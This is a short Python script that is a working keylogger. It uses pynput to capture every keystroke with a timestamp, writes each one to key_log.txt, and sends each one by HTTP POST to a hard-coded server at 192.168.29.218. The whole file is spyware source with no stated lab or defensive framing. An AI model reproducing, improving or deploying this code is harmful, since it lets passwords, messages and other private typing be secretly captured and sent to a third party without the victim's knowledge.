import requests
from pynput.keyboard import Listener
from datetime import datetime

log_file = "key_log.txt"
server_url = "http://192.168.29.218:5000/log"


def send_to_server(data):
    try:
        response = requests.post(server_url, data=data)
        print(f"Server Response: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to server: {e}")


def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        key_char = key.char
        log_message = f"[{timestamp}] Key Pressed: {key_char}"
    except AttributeError:
        key_char = str(key)
        log_message = f"[{timestamp}] Special Key Pressed: {key_char}"

    with open(log_file, "a") as file:
        file.write(f"{log_message}\n")

    send_to_server(log_message)


with Listener(on_press=on_press) as listener:
    listener.join()